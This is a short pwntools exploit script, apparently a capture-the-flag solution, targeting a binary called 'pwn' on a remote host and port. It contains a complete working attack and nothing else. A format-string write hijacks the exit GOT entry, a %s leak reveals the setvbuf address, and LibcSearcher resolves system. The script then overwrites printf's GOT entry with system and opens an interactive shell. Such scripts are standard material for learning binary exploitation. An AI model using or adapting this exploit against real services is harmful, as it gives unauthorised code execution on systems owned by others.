from pwn import *
from LibcSearcher import *
context(arch='amd64', log_level='debug')

io = process("./pwn")
io = remote('111.200.241.244', 49272)
elf = ELF("./pwn")

payload = fmtstr_payload(8, {elf.got['exit']: 0x400982})

io.sendlineafter(b'enter:', b'3')
io.sendafter(b'slogan: ', payload)

io.sendlineafter(b'slogan: ', b'%10$saaa' + p64(elf.got['setvbuf']))

setvbuf_addr = u64(io.recvuntil(b'bye~')[1:7] + b'\x00\x00')
print(hex(setvbuf_addr))

libc = LibcSearcher('setvbuf', setvbuf_addr)
system_addr = libc.dump('system') + setvbuf_addr - libc.dump('setvbuf')

payload = fmtstr_payload(10, {elf.got['printf']: system_addr})
print(system_addr)
io.sendlineafter(b'slogan: ', payload)

io.interactive()